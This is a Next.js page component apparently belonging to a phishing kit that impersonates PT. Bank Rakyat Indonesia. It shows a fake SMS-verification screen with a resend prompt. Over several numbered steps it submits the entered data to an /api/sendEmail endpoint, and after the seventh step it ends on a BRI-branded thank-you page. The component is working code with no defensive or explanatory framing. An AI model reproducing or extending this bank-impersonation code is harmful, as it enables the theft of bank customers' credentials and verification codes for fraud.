
import { useRouter } from 'next/router'
import React, { useEffect, useState } from 'react'
import SiteVerifikasi from '../../components/SiteVerifikasi'
import Inbox from '../../public/inbox.jpeg'
import Image from 'next/image'


function VerifikasiDetail({host}) {

   const [showAlert, setShowAlert] = useState(false)

   const router = useRouter()
   const {query} = router

  const handleMessage = async (data) => {

    document.getElementById('btn').innerHTML = 'Loading...'
      try {

        
        const response = await fetch('/api/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'url': host
            },
            body: JSON.stringify(data)
        })

        const json = await response.json()
        
        if (json.status === 200) {
            document.getElementById('btn').innerHTML = 'LANJUT'
            let id = parseInt(query.id) + 1
            router.push({
                pathname: `/verifikasi/${id}`,
            })
            document.getElementById('msg').value = ''
        } else{
            document.getElementById('btn').innerHTML = 'LANJUT'
            console.log(json.error)
        }

      } catch (error) {
          document.getElementById('btn').innerHTML = 'LANJUT'
          console.log(error.message);
      }
  }

  useEffect(() => {
    if (query.id === '7') {
      setShowAlert(true)
      return
    }
      
  }, [query])

  return (
    <div className="container">
      <div className='container-flex'>
          {
            showAlert ?
            <>
                <div  style={{margin:'2em auto 0 auto'}}>
                    <Image src="/gb.jpeg" alt="logo1" width={300} height={280}/>
                </div>
                    <div style={{textAlign:'center', padding:'0 2.1px'}}>
                        <h3 style={{fontWeight:'bold'}}>
                        PT. Bank Rakyat Indonesia (Persero) Tbk.
                        </h3>
                        <h3 style={{marginTop:'-20px', fontWeight:'normal'}}>Gedung BRI</h3>
                        <p>

                            Jl. Jenderal Sudirman No.14, RT.14/RW.1, Bendungan Hilir, Tanah Abang, Central Jakarta City, Jakarta 10210

                        </p>
                        <h3 style={{color:'rgb(14 120 202'}}>Terima Kasih</h3>    
                    </div>
            </>
            :
            <div className='bg-full-grey'>
                <div className='img-inbox'>
                <Image src={Inbox} alt="inbox"/>
                </div>
                <div className='card-pesan'>
                    <SiteVerifikasi btnClick = {(data)=>handleMessage(data)} query={query.id}/>
                </div>
                <p style={{textAlign:'center', fontWeight:'bold', marginTop:'1em', color:'gray', fontSize:'0.8em'}}>Tidak Terima SMS? <span style={{fontWeight:'lighter'}}>Kirim Ulang</span></p>
            </div>
            
          }
      </div>
    </div>
  )
}

export async function getServerSideProps(context) {

  const host = context.req.headers.host
  
  return {
    props: {
      host
    },
  }
}

export default VerifikasiDetail